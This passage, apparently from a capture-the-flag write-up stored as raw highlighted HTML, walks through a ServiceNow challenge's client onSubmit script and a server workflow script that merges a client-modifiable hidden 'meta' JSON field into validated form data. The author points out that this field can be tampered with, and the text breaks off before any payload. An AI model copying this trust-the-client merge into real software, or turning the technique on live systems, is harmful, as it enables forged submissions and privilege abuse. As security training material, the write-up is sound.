class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> meta \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {};\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> time \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">Date\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> submitter \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> g_user.userID;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> submitterName \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> g_user.\u003C/span>\u003Cspan style=\"--0:#B392F0\">getFullName\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">meta.time \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> time.\u003C/span>\u003Cspan style=\"--0:#B392F0\">toLocaleString\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">meta.submitter \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> submitter;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">meta.submitterName \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> submitterName;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">g_form.\u003C/span>\u003Cspan style=\"--0:#B392F0\">setValue\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"meta\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JSON\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.\u003C/span>\u003Cspan style=\"--0:#B392F0\">stringify\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(meta));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"function onSubmit() {  // Populate the &#x22;meta&#x22; variable with a JSON object containing the catalog item metadata  var meta = {};  var time = new Date();  var submitter = g_user.userID;  var submitterName = g_user.getFullName();  meta.time = time.toLocaleString();  meta.submitter = submitter;  meta.submitterName = submitterName;  g_form.setValue(&#x22;meta&#x22;, JSON.stringify(meta));}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Note here, that this code is run on the server. However note that even though this a hidden field, it is still being submitted from the client, so we can modify it.\u003C/p>\n\u003Cp>Next to notice is the backend, which is the \u003Ccode>Flag Holder Application Workflow\u003C/code>.\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;snow-workflow.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>There are two main issues here, First is in the “Validate Form Answers” If script:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">ifScript\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">() {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> now \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> global.\u003C/span>\u003Cspan style=\"--0:#B392F0\">ServiceNowObjectUtils\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> form_data \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {};\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">now.\u003C/span>\u003Cspan style=\"--0:#B392F0\">merge\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(form_data, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JSON\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.\u003C/span>\u003Cspan style=\"--0:#B392F0\">parse\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(current.variables.meta));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">now.\u003C/span>\u003Cspan style=\"--0:#B392F0\">merge\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(form_data, current.variables);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> ritm_data \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {};\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">now.\u003C/span>\u003Cspan style=\"--0:#B392F0\">merge\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(ritm_data, current);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">gs.\u003C/span>\u003Cspan style=\"--0:#B392F0\">info\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">JSON\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.\u003C/span>\u003Cspan style=\"--0:#B392F0\">stringify\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(form_data));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> issues \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#99A0A6\">// Validate form submission\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (form_data.submitter \u003C/span>\u003Cspan style=\"--0:#F97583\">!=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> current.opened_by.sys_id) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">issues.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"You don't seem to be the opener of this case.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (form_data.do_you_want_to_be_a_flag_holder \u003C/span>\u003Cspan style=\"--0:#F97583\">!==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Yes\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">issues.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"You must want to be a flag holder.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> HSLUtils \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> global.\u003C/span>\u003Cspan style=\"--0:#B392F0\">HSLUtils\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> colors \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> form_data.question_color_palette_of_meal.\u003C/span>\u003Cspan style=\"--0:#B392F0\">split\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"|\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (colors.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">length\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">!==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">issues.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"You must select 4 colors.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">; i \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> colors.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">length\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">; i\u003C/span>\u003Cspan style=\"--0:#F97583\">++\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">HSLUtils.\u003C/span>\u003Cspan style=\"--0:#B392F0\">test\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(colors[i])) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">issues.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Invalid color: \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> colors[i]);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (form_data.question_favorite_ice_shape \u003C/span>\u003Cspan style=\"--0:#F97583\">!==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"ic_klein_bottle\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">issues.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"We only like 4D ice here.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (form_data.question_describe_food_taste.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">length\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">30\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">issues.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Please describe the taste of food in more detail.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (issues.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">length\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">workflow.scratchpad.issue_message \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> issues.\u003C/span>\u003Cspan style=\"--0:#B392F0\">join\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">workflow.scratchpad.issue_count \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> issues.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">length\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">false\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">true\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">answer \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">ifScript\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">() \u003C/span>\u003Cspan style=\"--0:#F97583\">?\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"yes\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">:\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"no\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"function ifScript() {  var now = new global.ServiceNowObjectUtils();  var form_data = {};  now.merge(form_data, JSON.parse(current.variables.meta));  now.merge(form_data, current.variables);  var ritm_data = {};  now.merge(ritm_data, current);  gs.info(JSON.stringify(form_data));  var issues = [];  // Validate form submission  if (form_data.submitter != current.opened_by.sys_id) {    issues.push(&#x22;You don&#x27;t seem to be the opener of this case.&#x22;);  }  if (form_data.do_you_want_to_be_a_flag_holder !== &#x22;Yes&#x22;) {    issues.push(&#x22;You must want to be a flag holder.&#x22;);  }  var HSLUtils = new global.HSLUtils();  var colors = form_data.question_color_palette_of_meal.split(&#x22;|&#x22;);  if (colors.length !== 4) {    issues.push(&#x22;You must select 4 colors.&#x22;);  }  for (var i = 0; i \u003C colors.length; i++) {    if (!HSLUtils.test(colors[i])) {      issues.push(&#x22;Invalid color: &#x22; + colors[i]);    }  }  if (form_data.question_favorite_ice_shape !== &#x22;ic_klein_bottle&#x22;) {    issues.push(&#x22;We only like 4D ice here.&#x22;);  }  if (form_data.question_describe_food_taste.length \u003C 30) {    issues.push(&#x22;Please describe the taste of food in more detail.&#x22;);  }  if (issues.length > 0) {    workflow.scratchpad.issue_message = &#x22;\\n&#x22; + issues.join(&#x22;\\n&#x22;);    workflow.scratchpad.issue_count = issues.length;    return false;  }  return true;}answer = ifScript() ? &#x22;yes&#x22; : &#x22;no&#x22;;\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>At the top of the script, we call:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> now \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> global.\u003C/span>\u003Cspan style=\"--0:#B392F0\">ServiceNowObjectUtils\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> form_data \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {};\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">now.\u003C/span>\u003Cspan style=\"--0:#B392F0\">merge\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(form_data, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JSON\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.\u003C/span>\u003Cspan style=\"--0:#B392F0\">parse\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(current.variables.meta));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan 